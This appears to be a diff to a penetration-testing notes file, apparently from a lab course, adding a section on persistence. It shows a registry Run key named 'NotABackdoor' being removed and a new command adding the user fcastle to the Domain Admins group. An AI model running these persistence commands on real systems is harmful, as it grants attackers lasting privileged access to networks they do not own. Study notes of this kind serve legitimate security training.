@@ -266,3 +266,9 @@ C:\Users\tcm\Downloads>reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\Cur
 #delete registry key
 reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "NotABackdoor" /f
 ```
+
+### Adding Ourselves to Administrator Group
+```bash
+#not recommanded but provide persistance
+net group "Domain Admins" fcastle /ADD /DOMAIN
+```
